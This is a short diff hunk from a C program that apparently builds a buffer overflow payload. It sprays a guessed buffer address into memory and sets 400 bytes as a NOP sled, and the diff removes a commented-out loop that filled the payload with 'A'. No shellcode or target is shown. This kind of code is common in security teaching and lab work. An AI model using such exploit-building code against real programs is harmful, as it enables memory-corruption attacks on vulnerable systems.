@@ -35,12 +35,6 @@ int main(int argc, char **argv)
 		*(addr_ptr ++) =  (long)bufferAddress;
 	}
 	
-	/*
-	for(i = 0; i < PAYLOAD_BUFFER_SIZE; ++ i)
-	{
-		payload[i] = 'A';
-	}*/
-
 	/*Set half char as NOP*/
 	for(i = 0; i < 400; ++ i)
 	{
